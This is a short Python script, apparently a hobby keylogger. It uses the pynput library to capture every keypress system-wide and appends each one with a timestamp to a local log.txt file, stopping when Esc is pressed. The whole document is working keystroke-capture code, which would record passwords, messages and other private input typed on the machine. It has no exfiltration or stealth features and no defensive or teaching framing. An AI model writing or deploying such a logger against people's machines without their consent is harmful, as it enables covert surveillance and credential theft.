import time
from pynput import keyboard


def get_time():
    current_time = time.asctime() 
    return current_time

def logger(key):
    # Creates .txt file and logs all inputs
    with open("log.txt", "a") as file:
        file.write(f"{get_time()}: {key}\n".replace("'", ""))
    file.close()
    
    # Escaping when esc is pressed
    if key == keyboard.Key.esc:
        listener.stop()

with keyboard.Listener(on_press=logger) as listener:
    print("Ready")
    listener.join()
